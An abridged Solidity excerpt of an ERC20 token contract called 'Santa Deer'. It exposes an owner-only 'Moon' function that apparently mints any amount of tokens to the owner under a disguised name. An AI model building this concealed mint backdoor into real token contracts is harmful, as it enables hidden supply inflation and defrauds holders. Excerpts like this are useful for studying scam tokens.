...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function Moon(uint256 amount) public onlyOwner {
    _moon(msg.sender, amount);
    }
    ...
    function _moon(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: moon to the zero address");
...
contract SANTADEER is ERC20 {

    uint tokenTotalSupply = 1000000000000; //1b

    constructor() public ERC20("Santa Deer", "$SDC") {
        _moon(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}